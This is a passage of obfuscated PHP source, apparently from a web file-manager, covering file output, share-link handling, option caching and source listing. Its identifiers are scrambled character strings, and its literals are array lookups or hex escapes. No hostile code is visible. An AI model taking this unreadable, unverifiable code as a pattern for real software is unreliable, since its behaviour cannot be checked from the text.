_get($GLOBALS[$Îå˜÷ª™[7]], $Îå˜÷ª™[1391]); $‚ËŸ = Model($Îå˜÷ª™[649])->createFileName($ÔÒáœ‹[$Îå˜÷ª™[87]], $º¶ø€Î, $ºâÂ‰¬ä); return IO::uploadLink($‚ËŸ, $ìÒè’ÁÌ); } public function fileNameAuto($­»¨õ”, $Õ¤¶ìï°, $Ëïá÷øÑ = REPEAT_REPLACE, $ŒÖ’¦û˜ = false) { return $this->model->fileNameAuto($­»¨õ”, $Õ¤¶ìï°, $Ëïá÷øÑ, $ŒÖ’¦û˜); } public function fileNameExist($©£·”é¡, $ÑÃ•é˜) { return $this->model->fileNameExist($©£·”é¡, $ÑÃ•é˜); } protected function _fileOut($ûüë»¼É, $Şã¯Ÿ Õ = false, $ÍÜ†‚ÓÆ = false, $è¬Ëåû = '', $Ü§“ˆ‡¡ = false) { $ª»°Î¼Æ =& $_SERVER[³à¼î¯á]; $¾Ş¢ ÚÔ = $this->model->sourceInfo($ûüë»¼É); if ($¾Ş¢ ÚÔ[$ª»°Î¼Æ[460]] == $ª»°Î¼Æ[91]) { header($ª»°Î¼Æ[1392]); die; } $ç¥„ËŞ = $this->model->fileInfoGet($ûüë»¼É); $è¬Ëåû = $ç¥„ËŞ[$ª»°Î¼Æ[522]] ? $ç¥„ËŞ[$ª»°Î¼Æ[522]] : $è¬Ëåû; $­×—¯—¼ = is_array($GLOBALS[$ª»°Î¼Æ[172]]) ? $GLOBALS[$ª»°Î¼Æ[172]][$ª»°Î¼Æ[32]] : $¾Ş¢ ÚÔ[$ª»°Î¼Æ[32]]; if ($Ü§“ˆ‡¡) { return IO::fileOutServer($ç¥„ËŞ[$ª»°Î¼Æ[87]], $Şã¯Ÿ Õ, $­×—¯—¼, $è¬Ëåû); } IO::fileOut($ç¥„ËŞ[$ª»°Î¼Æ[87]], $Şã¯Ÿ Õ, $­×—¯—¼, $è¬Ëåû); } public function fileOut($¯ÅÑåæ, $‘‡ßûù = false, $¤¨ä¯˜· = false, $ƒë×øü¦ = '') { $this->_fileOut($¯ÅÑåæ, $‘‡ßûù, $¤¨ä¯˜·, $ƒë×øü¦); } public function fileOutServer($¸·ˆ¯ªÙ, $Ë–¦õ—ï = false, $”Î¾Æ…è = false, $™·¢®ğÓ = '') { $this->_fileOut($¸·ˆ¯ªÙ, $Ë–¦õ—ï, $”Î¾Æ…è, $™·¢®ğÓ, !0); } protected function _fileOutImage($ËŸƒâó€, $é¿–ë—‚ = 250) { $ ¶ÎÒÊ =& $_SERVER[³à¼î¯á]; $‘È½ŒÍÈ = $this->model->pathInfo($ËŸƒâó€); if ($‘È½ŒÍÈ[$ ¶ÎÒÊ[460]] == $ ¶ÎÒÊ[91]) { show_json($ ¶ÎÒÊ[1393] . $ËŸƒâó€, !1); } $‡ÅÁ½š¶ = $this->model->fileInfoGet($ËŸƒâó€); $‘È½ŒÍÈ[$ ¶ÎÒÊ[173]] = $‡ÅÁ½š¶[$ ¶ÎÒÊ[87]]; $GLOBALS[$ ¶ÎÒÊ[172]] = $‘È½ŒÍÈ; IO::fileOutImage($‡ÅÁ½š¶[$ ¶ÎÒÊ[87]], $é¿–ë—‚); } public function fileOutImage($Ÿ°¡ş, $Ì‡÷µ¹ = 250) { $this->_fileOutImage($Ÿ°¡ş, $Ì‡÷µ¹); } public function fileOutImageServer($îß¯¥ÕÏ, $¬ Ò†›ü = 250) { $this->_fileOutImage($îß¯¥ÕÏ, $¬ Ò†›ü); } public function link($öˆ½¾İ“, $´­³Ãî‚ = '') { $Ú“¹Š¹â = $this->model->fileInfoGet($öˆ½¾İ“); return IO::link($Ú“¹Š¹â[$_SERVER[³à¼î¯á][87]], $´­³Ãî‚); } protected function parse($ûø£··›) { $¥ôÀª‡÷ =& $_SERVER[³à¼î¯á]; if (strstr($ûø£··›, $¥ôÀª‡÷[8]) === !1) { return array($¥ôÀª‡÷[468] => intval($ûø£··›), $¥ôÀª‡÷[87] => $¥ôÀª‡÷[12], $¥ôÀª‡÷[1389] => array()); } $£Îâ¶Ùë = explode($¥ôÀª‡÷[8], trim($ûø£··›, $¥ôÀª‡÷[8])); if (count($£Îâ¶Ùë) < 2) { show_tips(clear_html($ûø£··›) . $¥ôÀª‡÷[1394]); } return array($¥ôÀª‡÷[468] => intval($£Îâ¶Ùë[0]), $¥ôÀª‡÷[87] => $£Îâ¶Ùë[1], $¥ôÀª‡÷[1389] => array_slice($£Îâ¶Ùë, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($º¯Ò£Áì) { $this->pathParse = $º¯Ò£Áì; $this->model = Model($_SERVER[³à¼î¯á][1388]); } public function getPathOuter($ÛÓß‡˜ç) { $ûˆÄã­Û =& $_SERVER[³à¼î¯á]; if (!$ÛÓß‡˜ç) { return $ÛÓß‡˜ç; } $Ä…ı ğÎ = $this->parse($ÛÓß‡˜ç); return trim(KodIO::makeShare($this->pathParse[$ûˆÄã­Û[450]], $Ä…ı ğÎ[$ûˆÄã­Û[450]]), $ûˆÄã­Û[8]); } protected function infoParse($ù­²Ñ¯Î, $ÏÖ¶ß = false, $Ã«®È§š = false) { $æÃÎŠ—ğ =& $_SERVER[³à¼î¯á]; $öÇå­§ = $this->pathParse[$æÃÎŠ—ğ[450]]; $ğğœ†´ª = trim($this->pathParse[$æÃÎŠ—ğ[1222]], $æÃÎŠ—ğ[8]); return Action($æÃÎŠ—ğ[1395])->sharePathInfo($öÇå­§, $ğğœ†´ª, $ÏÖ¶ß); } public function infoFull($È²Û²¸å) { $Ùûá› =& $_SERVER[³à¼î¯á]; $µêç¶üŸ = explode($Ùûá›[8], trim($È²Û²¸å, $Ùûá›[8])); if (count($µêç¶üŸ) > 1) { $›îæ“í‰ = implode($Ùûá›[8], array_splice($µêç¶üŸ, 1)); $ø€Ë¡ƒ = $this->model->pathInfoByPath($µêç¶üŸ[0], $›îæ“í‰); if (!$ø€Ë¡ƒ) { return !1; } $this->pathParse[$Ùûá›[1222]] = $ø€Ë¡ƒ[$Ùûá›[184]]; } return $this->infoParse($È²Û²¸å); } public function listAll($µÅ°çŸª) { $ÙîÂø• =& $_SERVER[³à¼î¯á]; $ªé•îúó = IO::info($this->pathParse[$ÙîÂø•[87]]); if (!$ªé•îúó) { return array(); } $¹ëöÊù» = $this->model->listAll($µÅ°çŸª); $…¤â±Ô± = Model($ÙîÂø•[639])->getInfo($ªé•îúó[$ÙîÂø•[640]]); foreach ($¹ëöÊù» as &$Ñı’ÌîÖ) { check_abort(); $Ñı’ÌîÖ[$ÙîÂø•[90]] = Action($ÙîÂø•[1395])->_shareItemeParse($Ñı’ÌîÖ[$ÙîÂø•[90]], $…¤â±Ô±); } unset($Ñı’ÌîÖ); return $¹ëöÊù»; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÄÏöù§æ) { $this->pathParse = $ÄÏöù§æ; $this->model = Model($_SERVER[³à¼î¯á][1388]); } protected function infoParse($…™½ƒíó, $‹‰·Õ„£ = false, $åÈÆ»‡˜ = false) { $æ®‚¸î• =& $_SERVER[³à¼î¯á]; return Action($æ®‚¸î•[1228])->sharePathInfo($this->pathParse[$æ®‚¸î•[87]], !0, $‹‰·Õ„£); } public function listPath($ß˜½ôÜ­, $¥Û¸× = false) { $Éäß·»ı =& $_SERVER[³à¼î¯á]; $áˆóïıŞ = parent::listPath($ß˜½ôÜ­, $¥Û¸×); if (!$áˆóïıŞ) { return $áˆóïıŞ; } if (is_array($áˆóïıŞ[$Éäß·»ı[1396]])) { $áˆóïıŞ[$Éäß·»ı[1396]] = Action($Éäß·»ı[1228])->shareItemInfo($áˆóïıŞ[$Éäß·»ı[1396]]); } foreach ($áˆóïıŞ as $õİ°ñË» => $ğŸÁ¥¹«) { if (!in_array($õİ°ñË», array($Éäß·»ı[86], $Éäß·»ı[85]))) { continue; } foreach ($ğŸÁ¥¹« as $Ñš¡‰°¥ => $‡Ùç±§ı) { $áˆóïıŞ[$õİ°ñË»][$Ñš¡‰°¥] = Action($Éäß·»ı[1228])->shareItemInfo($‡Ùç±§ı); } } return $áˆóïıŞ; } public function listAll($®´”É‡º) { $‹²‘ãÇ… =& $_SERVER[³à¼î¯á]; $çİÀ–î§ = IO::info($this->pathParse[$‹²‘ãÇ…[87]]); if (!$çİÀ–î§) { return array(); } $ÊØ¢¹š¥ = $this->model->listAll($®´”É‡º); foreach ($ÊØ¢¹š¥ as &$â“µ§®Ï) { $â“µ§®Ï[$‹²‘ãÇ…[90]] = Action($‹²‘ãÇ…[1228])->shareItemInfo($â“µ§®Ï[$‹²‘ãÇ…[90]]); } unset($â“µ§®Ï); return $ÊØ¢¹š¥; } } goto d‘¯ÈÇ•è; EİÒÈÎ‡—õ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($±Ø¢©® = false, $Œà»öšù = '', $÷“¨ñ = false) { $Ğ¤¶ŠÃõ =& $_SERVER[³à¼î¯á]; $Üªä¦ò¡ = $this->cacheGet($Œà»öšù); $óæ¨ÓªĞ = $this->optionDefault($Œà»öšù); $óæ¨ÓªĞ = is_array($óæ¨ÓªĞ) ? $óæ¨ÓªĞ : array(); if (is_array($Üªä¦ò¡)) { $Üªä¦ò¡ = array_merge($óæ¨ÓªĞ, $Üªä¦ò¡); return $±Ø¢©® ? isset($Üªä¦ò¡[$±Ø¢©®]) ? $Üªä¦ò¡[$±Ø¢©®] : null : $Üªä¦ò¡; } $•«³„»· = $this->filterWhere(array($Ğ¤¶ŠÃõ[33] => $Œà»öšù)); $Üªä¦ò¡ = $this->where($•«³„»·)->select(); $Üªä¦ò¡ = array_to_keyvalue($Üªä¦ò¡, $Ğ¤¶ŠÃõ[97], $Ğ¤¶ŠÃõ[425]); foreach ($Üªä¦ò¡ as $“úãôö => $¸ğ°—ã¦) { if ($÷“¨ñ || in_array($“úãôö, $this->jsonField)) { $Üªä¦ò¡[$“úãôö] = json_decode($¸ğ°—ã¦, !0); } } $this->cacheSet($Œà»öšù, $Üªä¦ò¡); $Üªä¦ò¡ = array_merge($óæ¨ÓªĞ, $Üªä¦ò¡); return $±Ø¢©® ? $Üªä¦ò¡[$±Ø¢©®] : $Üªä¦ò¡; } public function set($•±½ù¾, $’²µÒË¥ = false, $áÅ¿âÔ = '') { $›¹çá×¶ =& $_SERVER[³à¼î¯á]; $this->cacheRemove($áÅ¿âÔ); $¶ŸüØ = array(); $®ó»ãÍá = is_array($•±½ù¾) ? $•±½ù¾ : array($•±½ù¾ => $’²µÒË¥); foreach ($®ó»ãÍá as $µÇİæ· => $éÒ¥¬Ú) { if (is_array($éÒ¥¬Ú)) { $éÒ¥¬Ú = json_encode_force($éÒ¥¬Ú); } $this->checkLength($éÒ¥¬Ú, !1, $this->tableName . $›¹çá×¶[4] . $•±½ù¾); $éÒ¥¬Ú = self::textEncode($éÒ¥¬Ú); $®ó»ãÍá = array($›¹çá×¶[33] => $áÅ¿âÔ, $›¹çá×¶[97] => $µÇİæ·, $›¹çá×¶[425] => $éÒ¥¬Ú); $¶ŸüØ[] = $this->filterWhere($®ó»ãÍá); } if (!$¶ŸüØ) { return !0; } $‡³³» ï = $this->cacheKey($›¹çá×¶[451]); CacheLock::lock($‡³³» ï); $´Éõ á‹ = $this->addAll($¶ŸüØ, array(), !0); CacheLock::unlock($‡³³» ï); return $´Éõ á‹; } protected function optionDefault($ìß•šŸ = '') { return !1; } public function setDeep($ÊË“¦çÎ, $ö¥à”É = false, $’‘¾Ï¬ = '') { $ø­éø© = explode($_SERVER[³à¼î¯á][10], $ÊË“¦çÎ); $¶¨êçÜ² = $this->get(); array_set_value($¶¨êçÜ², $ÊË“¦çÎ, $ö¥à”É); $this->set($ø­éø©[0], $¶¨êçÜ²[$ø­éø©[0]], $’‘¾Ï¬); } public function remove($¢ßÄı¸‹, $±¼¦ÛØ™ = '') { $ü•¿Ù‰Š =& $_SERVER[³à¼î¯á]; $this->cacheRemove($±¼¦ÛØ™); $ì¤ˆ« = $this->filterWhere(array($ü•¿Ù‰Š[97] => $¢ßÄı¸‹, $ü•¿Ù‰Š[33] => $±¼¦ÛØ™)); if (is_null($¢ßÄı¸‹)) { unset($ì¤ˆ«[$ü•¿Ù‰Š[97]]); } return $this->where($ì¤ˆ«)->delete(); } public function cacheSet($ßàëèçë, $²ÕÑ¼Õ = false) { return Cache::set($this->cacheKey($ßàëèçë), $²ÕÑ¼Õ); } public function cacheGet($èàÒœ¢ö) { return Cache::get($this->cacheKey($èàÒœ¢ö)); } public function cacheRemove($½Ï÷“Â€) { return Cache::remove($this->cacheKey($½Ï÷“Â€)); } protected function filterWhere($¢ªÁ¼Â) { return $¢ªÁ¼Â; } protected function cacheKey($èìâÃ¸) { return $èìâÃ¸; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\x63\x65"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\155\x65" => "\151\157\x5f\x73\x6f\x75\x72\143\145\137\x6d\145\x74\x61", "\x6d\145\164\x61\x46\x69\x65\154\x64" => "\163\157\165\x72\x63\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\124\x69\x6d\x65", "\164\151\155\x65", "\151\156\163\x65\x72\x74", "\146\x75\156\143\x74\151\157\x6e"), array("\143\162\x65\141\x74\145\124\151\155\145", "\x74\151\155\x65", "\151\x6e\163\145\162\164", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\x76\x69\x65\167\124\151\155\145", "\164\151\155\x65", "\x69\x6e\163\145\162\x74", "\146\165\156\143\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Áª˜°ø†) { return $this->listSource(array($_SERVER[³à¼î¯á][452] => $Áª˜°ø†)); } public function typeName($ŞùÉÚç¯) { static $ÏŞÒâ£Æ = array(self::TYPE_SYSTEM => "\x73\171\x73\164\145\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\x6f\165\x70"); return $ÏŞÒâ£Æ[$ŞùÉÚç¯ . $_SERVER[³à¼î¯á][12]]; } public function sourceListInfo($–¾œÜİ—, $ïÏéöë = false) { $Ò¸¸¹Ø° =& $_SERVER[³à¼î¯á]; $–¾œÜİ— = $–¾œÜİ— ? $–¾œÜİ— : array(); $–¾œÜİ— = array_filter(array_unique($–¾œÜİ—)); if (!$–¾œÜİ—) { return array(); } $†õ­Ğé = $this->where(array($Ò¸¸¹Ø°[184] => array($Ò¸¸¹Ø°[7], $–¾œÜİ—)))->select(); $this->_listDataApply($†õ­Ğé, $ïÏéöë); return array_to_keyvalue($†õ­Ğé, $Ò¸¸¹Ø°[184]); } public function pathInfoFilter(&$ÊÛ÷ŞŸÛ) { $“†ÃÛãÂ =& $_SERVER[³à¼î¯á]; static $¡ôğø¯‡ = false; static $³òéÆ‡ß = false; static $ü‘³‹Ô = false; if (!$¡ôğø¯‡) { $©´ÀÂ¬Ê = $“†ÃÛãÂ[453]; $©´ÀÂ¬Ê .= $“†ÃÛãÂ[454]; $©´ÀÂ¬Ê .= $“†ÃÛãÂ[455]; $˜‹–Âè„ = $“†ÃÛãÂ[456]; $éÊ¥¾… = explode($“†ÃÛãÂ[50], $˜‹–Âè„); $¡ôğø¯‡ = explode($“†ÃÛãÂ[50], $©´ÀÂ¬Ê); $³òéÆ‡ß = array(); foreach ($¡ôğø¯‡ as $ƒæ¹ò) { if (in_array($ƒæ¹ò, $éÊ¥¾…)) { continue; } $³òéÆ‡ß[] = $ƒæ¹ò; } $ü‘³‹Ô = explode($“†ÃÛãÂ[50], $“†ÃÛãÂ[457]); } foreach ($ü‘³‹Ô as $Å€…—áü) { if (isset($ÊÛ÷ŞŸÛ[$Å€…—áü])) { $ÊÛ÷ŞŸÛ[$Å€…—áü] = intval($ÊÛ÷ŞŸÛ[$Å€…—áü]); } } $ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[87]] = $“†ÃÛãÂ[458] . $ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[184]] . $“†ÃÛãÂ[459]; $ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[33]] = $ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[460]] == 1 ? $“†ÃÛãÂ[78] : $“†ÃÛãÂ[221]; $ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[181]] = $this->typeName($ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[181]]); if ($ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[460]] != 1) { $ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[178]] = $ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[461]]; unset($ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[461]]); } $ÄœÄ´´á = $¡ôğø¯‡; if (isset($ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[462]]) && $ÊÛ÷ŞŸÛ[$“†ÃÛãÂ[462]][$“†ÃÛãÂ[463]] == -1) { $ÄœÄ´´á = $³òéÆ‡ß; } $ÊÛ÷ŞŸÛ = array_field_key($ÊÛ÷ŞŸÛ, $ÄœÄ´´á); return $ÊÛ÷ŞŸÛ; } public function listUserFav() { $‡ÃÏ´í =& $_SERVER[³à¼î¯á]; $ÊŠó¶â¨ = Model($‡ÃÏ´í[464])->listData(); $Ã›æ‹¿» = array_filter_by_field($ÊŠó¶â¨, $‡ÃÏ´í[33], $‡ÃÏ´í[465]); $Ã›æ‹¿» = array_to_keyvalue($Ã›æ‹¿», $‡ÃÏ´í[12], $‡ÃÏ´í[87]); if ($Ã›æ‹¿») { $À›Çƒ€¼ = $this->listSource(array($‡ÃÏ´í[466] => array($‡ÃÏ´í[467], $Ã›æ‹¿»))); } $À›Çƒ€¼ = array_to_keyvalue($À›Çƒ€¼[$‡ÃÏ´í[420]], $‡ÃÏ´í[184]); foreach ($ÊŠó¶â¨ as &$‰Òó¢×) { $‰Òó¢× = array($‡ÃÏ´í[468] => $‰Òó¢×[$‡ÃÏ´í[450]], $‡ÃÏ´í[469] => $‰Òó¢×[$‡ÃÏ´í[32]], $‡ÃÏ´í[470] => $‰Òó¢×[$‡ÃÏ´í[87]], $‡ÃÏ´í[471] => $‰Òó¢×[$‡ÃÏ´í[33]], $‡ÃÏ´í[472] => $‰Òó¢×[$‡ÃÏ´í[222]], $‡ÃÏ´í[473] => $‰Òó¢×[$‡ÃÏ´í[88]]); if ($‰Òó¢×[$‡ÃÏ´í[33]] == $‡ÃÏ´í[465] && $À›Çƒ€¼[$‰Òó¢×[$‡ÃÏ´í[87]]]) { $‰Òó¢×[$‡ÃÏ´í[90]] = $À›Çƒ€¼[$‰Òó¢×[$‡ÃÏ´í[87]]]; } } unset($‰Òó¢×); return $ÊŠó¶â¨; } public function listUserTag($úº¾İÃâ) { $°Œ‡õÌ‡ =& $_SERVER[³à¼î¯á]; if ($úº¾İÃâ && !is_array($úº¾İÃâ)) { $úº¾İÃâ = array($úº¾İÃâ); } $”´©¤² = Model($°Œ‡õÌ‡[474])->listData(); $ŒÓ…ªç = array(); $ÏİÏ™¢û = array(); foreach ($”´©¤² as $ÔëÎâ¬‹) { $×Ñ£Úòé = $ÔëÎâ¬‹[$°Œ‡õÌ‡[87]]; if (!$×Ñ£Úòé) { continue; } if (!isset($ÏİÏ™¢û[$×Ñ£Úòé])) { $ÏİÏ™¢û[$×Ñ£Úòé] = array(); } $ÏİÏ™¢û[$×Ñ£Úòé][] = $ÔëÎâ¬‹[$°Œ‡õÌ‡[475]]; $ŒÓ…ªç[$ÔëÎâ¬‹[$°Œ‡õÌ‡[87]]] = $ÔëÎâ¬‹; } $œÀœ¦õ = array(); $¥œåÛÍ¨ = array(); $Øªâ¼ğƒ = array(); foreach ($ÏİÏ™¢û as $Ç·É­õ× => $î¯ôÈ»ë) { $ï£Ûí²± = !0; if (!$úº¾İÃâ) { $œÀœ¦õ[] = $Ç·É­õ×; continue; } foreach ($úº¾İÃâ as $£“ªëìŠ) { if (!in_array($£“ªëìŠ, $î¯ôÈ»ë)) { $ï£Ûí²± = !1; break; } } if (!$ï£Ûí²±) { continue; } if (!is_numeric($Ç·É­õ×)) { $œË¶õÔÒ = $ŒÓ…ªç[$Ç·É­õ×]; $ï»­Á™ = array($°Œ‡õÌ‡[32] => $œË¶õÔÒ[$°Œ‡õÌ‡[32]], $°Œ‡õÌ‡[87] => $œË¶õÔÒ[$°Œ‡õÌ‡[87]], $°Œ‡õÌ‡[33] => $œË¶õÔÒ[$°Œ‡õÌ‡[33]], $°Œ‡õÌ‡[90] => array($°Œ‡õÌ‡[476] => 1), $°Œ‡õÌ‡[223] => !0); if ($œË¶õÔÒ[$°Œ‡õÌ‡[33]] == $°Œ‡õÌ‡[221]) { $Øªâ¼ğƒ[] = $ï»­Á™; } if ($œË¶õÔÒ[$°Œ‡õÌ‡[33]] == $°Œ‡õÌ‡[78]) { $¥œåÛÍ¨[] = $ï»­Á™; } continue; } $œÀœ¦õ[] = $Ç·É­õ×; } if ($œÀœ¦õ) { $ëäüú€ë = $this->listSource(array($°Œ‡õÌ‡[466] => array($°Œ‡õÌ‡[467], $œÀœ¦õ))); } $ëäüú€ë = $ëäüú€ë ? $ëäüú€ë : array($°Œ‡õÌ‡[85] => array(), $°Œ‡õÌ‡[86] => array()); $ëäüú€ë[$°Œ‡õÌ‡[85]] = array_merge($ëäüú€ë[$°Œ‡õÌ‡[85]], $¥œåÛÍ¨); $ëäüú€ë[$°Œ‡õÌ‡[86]] = array_merge($ëäüú€ë[$°Œ‡õÌ‡[86]], $Øªâ¼ğƒ); if (isset($ëäüú€ë[$°Œ‡õÌ‡[417]]) && count($œÀœ¦õ) == $ëäüú€ë[$°Œ‡õÌ‡[417]][$°Œ‡õÌ‡[418]]) { return $ëäüú€ë; } $¥­àš Œ = array(); $ãöÅæøœ = array_to_keyvalue($ëäüú€ë[$°Œ‡õÌ‡[85]], $°Œ‡õÌ‡[12], $°Œ‡õÌ‡[184]); $ìÜ‚Óü™ = array_to_keyvalue($ëäüú€ë[$°Œ‡õÌ‡[86]], $°Œ‡õÌ‡[12], $°Œ‡õÌ‡[184]); $à£ŒĞ™ı = array_merge($ìÜ‚Óü™, $ãöÅæøœ); foreach ($œÀœ¦õ as $×Ñ£Úòé) { if (!in_array($×Ñ£Úòé, $à£ŒĞ™ı)) { $¥­àš Œ[] = $×Ñ£Úòé; } } if ($¥­àš Œ) { Model($°Œ‡õÌ‡[477])->removeBySource($¥­àš Œ); } return $ëäüú€ë; } public function listUserRecycle() { $³Ñ¡ÛÀœ =& $_SERVER[³à¼î¯á]; $Ôğµ·¶ = Model($³Ñ¡ÛÀœ[478])->listData(); if (!$Ôğµ·¶) { return array(); } $€ä…ü¢· = array($³Ñ¡ÛÀœ[466] => array($³Ñ¡ÛÀœ[467], $Ôğµ·¶), $³Ñ¡ÛÀœ[479] => 1); return $this->listSource($€ä…ü¢·); } public function listSource($Ï§ığ–Á, $¢Ğ«õÏğ = 3000, $ÅÛßõûš = false) { $ÅŸäğ¤Å =& $_SERVER[³à¼î¯á]; if (!isset($Ï§ığ–Á[$ÅŸäğ¤Å[480]])) { $Ï§ığ–Á[$ÅŸäğ¤Å[480]] = 0; } if (isset($Ï§ığ–Á[$ÅŸäğ¤Å[183]]) && $Ï§ığ–Á[$ÅŸäğ¤Å[183]] == $ÅŸäğ¤Å[219]) { $Ï§ığ–Á[$ÅŸäğ¤Å[461]] = array($ÅŸäğ¤Å[382], $ÅŸäğ¤Å[481]); } $ãäÇ“Ìø = $ÅŸäğ¤Å[482]; $ÕÇµ³ª› = $this->field($ãäÇ“Ìø)->_makeOrder()->where($Ï§ığ–Á)->selectPage($¢Ğ«õÏğ); $this->_listPageCheck($ÕÇµ³ª›, $ãäÇ“Ìø, $Ï§ığ–Á); $this->_listDataApply($ÕÇµ³ª›[$ÅŸäğ¤Å[420]], $ÅÛßõûš); $this->_listMake($ÕÇµ³ª›); return $ÕÇµ³ª›; } private function _listPageCheck(&$Ô¡Õƒä‚, $…²ÄÅ‡î, $Üªıâ¡ä) { $“°úÎ¹â =& $_SERVER[³à¼î¯á]; if (!is_array($Ô¡Õƒä‚[$“°úÎ¹â[417]])) { return; } $‚Ô…š® = $Ô¡Õƒä‚[$“°úÎ¹â[417]]; if ($‚Ô…š®[$“°úÎ¹â[419]] <= 1) { return; } if ($‚Ô…š®[$“°úÎ¹â[418]] >= 100000) { return; } if (Model($“°úÎ¹â[483])->get($“°úÎ¹â[484]) != $“°úÎ¹â[485]) { return; } $…²ÄÅ‡î = str_replace(array($“°úÎ¹â[53], $“°úÎ¹â[393], $“°úÎ¹â[253]), $“°úÎ¹â[12], $…²ÄÅ‡î); $…²ÄÅ‡î = $“°úÎ¹â[486] . str_replace($“°úÎ¹â[50], $“°úÎ¹â[487], $…²ÄÅ‡î) . $“°úÎ¹â[488]; $Ú†ö¤µ¼ = $“°úÎ¹â[489]; $Ú†ö¤µ¼ = $Ú†ö¤µ¼ . $“°úÎ¹â[490]; $×ÅÙìéì = $‚Ô…š®[$“°úÎ¹â[414]] * ($‚Ô…š®[$“°úÎ¹â[404]] - 1) . $“°úÎ¹â[50] . $‚Ô…š®[$“°úÎ¹â[414]]; $úØµ†¦‰ = $this->_makeOrder(!0); $³•óã = $“°úÎ¹â[486] . str_replace($“°úÎ¹â[50], $“°úÎ¹â[487], $úØµ†¦‰[0]); if (strpos($³•óã, $“°úÎ¹â[491])) { $³•óã = str_replace($“°úÎ¹â[491], $“°úÎ¹â[492], $³•óã); } else { $³•óã .= $“°úÎ¹â[493] . $úØµ†¦‰[1]; } $„›ÔÛÖ = array(); foreach ($Üªıâ¡ä as $ÆéÅğ¼ => $Î´ìí‘Ú) { $„›ÔÛÖ[$“°úÎ¹â[486] . $ÆéÅğ¼] = $Î´ìí‘Ú; } $this->alias($“°úÎ¹â[494])->field($…²ÄÅ‡î)->limit($×ÅÙìéì)->order($³•óã); $·×·•í• = $this->join($Ú†ö¤µ¼)->where($„›ÔÛÖ)->select(); if ($·×·•í•) { $Ô¡Õƒä‚[$“°úÎ¹â[420]] = $·×·•í•; } } protected function _makeOrder($ ®ÔØÇÖ = false) { $¥ë«ù¡¥ =& $_SERVER[³à¼î¯á]; $ÎĞ‹Œ°“ = Model($¥ë«ù¡¥[495])->get($¥ë«ù¡¥[496]); $Şß£­»² = Model($¥ë«ù¡¥[495])->get($¥ë«ù¡¥[497]); $Ç˜»¸‡¦ = array($¥ë«ù¡¥[498] => $¥ë«ù¡¥[499], $¥ë«ù¡¥[500] => $¥ë«ù¡¥[501]); $ø‹¨¶ÕÖ = array($¥ë«ù¡¥[32] => $¥ë«ù¡¥[32], $¥ë«ù¡¥[79] => $¥ë«ù¡¥[79], $¥ë«ù¡¥[178] => $¥ë«ù¡¥[461], $¥ë«ù¡¥[502] => $¥ë«ù¡¥[502], $¥ë«ù¡¥[503] => $¥ë«ù¡¥[504], $¥ë«ù¡¥[222] => $¥ë«ù¡¥[222], $¥ë«ù¡¥[88] => $¥ë«ù¡¥[88]); $ÚÊ­§šÖ = Input::get($¥ë«ù¡¥[505], $¥ë«ù¡¥[7], $ÎĞ‹Œ°“, array_keys($ø‹¨¶ÕÖ)); $·õÃç×å = Input::get($¥ë«ù¡¥[506], $¥ë«ù¡¥[7], $Şß£­»², array_keys($Ç˜»¸‡¦)); if (!in_array($ÚÊ­§šÖ, array_keys($ø‹¨¶ÕÖ))) { $ÚÊ­§šÖ = $¥ë«ù¡¥[32]; } if (!in_array($·õÃç×å, array_keys($Ç˜»¸‡¦))) { $ÚÊ­§šÖ = $¥ë«ù¡¥[498]; } if ($ÚÊ­§šÖ == $¥ë«ù¡¥[32]) { } $‚ŒáÕŞ• = $¥ë«ù¡¥[507] . $ø‹¨¶ÕÖ[$ÚÊ­§šÖ] . $¥ë«ù¡¥[53] . $Ç˜»¸‡¦[$·õÃç×å]; $‚ŒáÕŞ• = rtrim(trim($‚ŒáÕŞ•), $¥ë«ù¡¥[50]); if ($ ®ÔØÇÖ) { return array($‚ŒáÕŞ•, $Ç˜»¸‡¦[$·õÃç×å]); } return $this->order($‚ŒáÕŞ•); } protected function _listDataApplyItem($´¡³¾²Æ, $Èá å•ä = false) { $Şã¤™¨º = array($´¡³¾²Æ); $this->_listDataApply($Şã¤™¨º, $Èá å•ä); return $Şã¤™¨º[0]; } protected function _listDataApply(&$©ïİè´ş, $™««ßÚû = false) { $»ˆ¾ª¬ =& $_SERVER[³à¼î¯á]; if (!$©ïİè´ş) { $©ïİè´ş = array(); return; } $ˆåÛ¨²Í = array_to_keyvalue($©ïİè´ş, $»ˆ¾ª¬[12], $»ˆ¾ª¬[184]); $ˆåÛ¨²Í = array_unique($ˆåÛ¨²Í); $this->_listSourceCache($©ïİè´ş); if (!$™««ßÚû) { $this->_listAppendMeta($©ïİè´ş, $ˆåÛ¨²Í); $this->_listAppendFileMeta($©ïİè´ş, $ˆåÛ¨²Í); $this->_listAppendChildren($©ïİè´ş, $ˆåÛ¨²Í); } $this->_listAppendPath($©ïİè´ş); $this->_listAppendAuth($©ïİè´ş); $this->_listAppendSourceInfo($©ïİè´ş, $ˆåÛ¨²Í); $this->_listAppendUser($©ïİè´ş); $this->_listFilterInfo($©ïİè´ş, $™««ßÚû); $this->_listAppendAuthSecret($©ïİè´ş); } protected function _listSourceCache($½•âõ„) { $àÉìé =& $_SERVER[³à¼î¯á]; foreach ($½•âõ„ as $úÔÅÑÖ¾) { self::$cacheSourceInfo[$àÉìé[508] . $úÔÅÑÖ¾[$àÉìé[184]]] = $úÔÅÑÖ¾; } } protected function 